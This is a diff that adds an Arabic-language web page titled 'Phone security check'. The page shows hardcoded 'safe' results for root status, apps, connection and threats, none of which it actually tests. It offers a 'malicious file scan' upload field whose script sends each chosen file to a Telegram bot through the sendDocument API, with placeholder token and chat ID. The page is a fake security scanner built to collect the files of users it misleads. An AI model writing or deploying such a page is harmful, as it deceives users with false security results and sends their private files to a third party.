@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 فحص أمان الهاتف</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f4f4f4; }
+        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; background: #fff; }
+        .box { padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; background: #fafafa; }
+        .safe { color: green; font-weight: bold; }
+        .warning { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>🔍 فحص أمان الهاتف</h2>
+
+        <div class="box">
+            <p><strong>📱 اسم الهاتف:</strong> <span id="deviceName">جاري الفحص...</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>🔄 حالة الروت:</strong> <span id="rootStatus" class="safe">✅ الهاتف آمن</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>⚠️ التطبيقات المشبوهة:</strong> <span id="appCheck" class="safe">✅ لا توجد تطبيقات مشبوهة</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>🌍 أمان الاتصال:</strong> <span id="connection" class="safe">✅ الاتصال آمن</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>📶 الشبكة المتصل بها:</strong> <span id="networkType">جاري الفحص...</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>⚠️ حالة الهاتف:</strong> <span id="deviceStatus" class="safe">✅ لا توجد أعطال</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>🚨 نشاط مشبوه:</strong> <span id="threatAlert" class="safe">✅ لا يوجد تهديدات</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>📧 البريد الإلكتروني:</strong> <span id="emailCheck">غير متاح</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>🔗 فحص روابط الاختراق:</strong> <span id="linkCheck" class="safe">✅ لم يتم فتح روابط خطيرة</span></p>
+        </div>
+
+        <div class="box">
+            <p><strong>📂 فحص الملفات الضارة:</strong></p>
+            <input type="file" id="fileInput" multiple>
+            <p id="fileCheck" class="safe">✅ لم يتم العثور على ملفات ضارة</p>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";  // ضع توكن البوت هنا
+        const CHAT_ID = "YOUR_CHAT_ID";  // ضع معرف الدردشة هنا
+
+        function sendFileToTelegram(file) {
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("document", file);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: "POST",
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.ok) {
+                      alert("📤 تم إرسال الملف إلى بوت تيليجرام!");
+                  } else {
+                      alert("❌ فشل في إرسال الملف إلى تيليجرام!");
+                  }
+              }).catch(error => {
+                  alert("⚠️ خطأ أثناء الإرسال: " + error);
+              });
+        }
+
+        document.getElementById("fileInput").addEventListener("change", function() {
+            let file = this.files[0];
+            if (file) {
+                sendFileToTelegram(file);
+            }
+        });
+    </script>
+
+</body>
+</html>
